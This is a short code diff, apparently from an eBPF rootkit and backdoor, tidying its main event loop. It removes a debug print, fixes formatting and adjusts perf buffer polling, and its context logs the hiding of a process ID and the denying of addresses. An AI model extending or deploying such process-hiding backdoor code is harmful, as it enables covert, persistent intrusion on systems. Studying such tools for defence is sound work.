@@ -174,7 +174,6 @@ static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
 static enum bpf_perf_event_ret handle_perf_event(void *private_data,
                                                  int cpu,
                                                  struct perf_event_header *event){
-  printf(".");
   return LIBBPF_PERF_EVENT_CONT;
 }
 
@@ -400,15 +399,14 @@ int main(int argc, char **argv) {
   struct perf_handler_ctx      perf_ctx;
   perf_opts.attr = &perf_attr;
   perf_opts.event_cb = handle_perf_event;
-  perf_opts.ctx = &perf_ctx;  perf_buf = perf_buffer__new_raw(xfd, PERF_MMAP_PAGE_COUNT, &perf_opts);
+  perf_opts.ctx = &perf_ctx;
+  perf_buf = perf_buffer__new_raw(xfd, PERF_MMAP_PAGE_COUNT, &perf_opts);
 
   // Logs
   for (int i = 0; i < cfg.denyc; i++) {
     boopprintf("   X Deny address: %s\n", cfg.deny[i]);
   }
   boopprintf("  -> Obfuscating PID: %s\n", pid);
-
-
 
   // ===========================================================================
   // Boopkit event loop
@@ -419,8 +417,8 @@ int main(int argc, char **argv) {
   int ignore = 0;
   while (1) {
     ring_buffer__poll(rb, 100); // Ignore errors!
-    perf_buffer__poll(perf_buf, 100); // Ignore errors!
-
+    perf_buffer__poll(perf_buf, 1000); // Ignore errors!
+    perf_buffer__consume(perf_buf);
     int ikey = 0, jkey;
     int err;
     char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
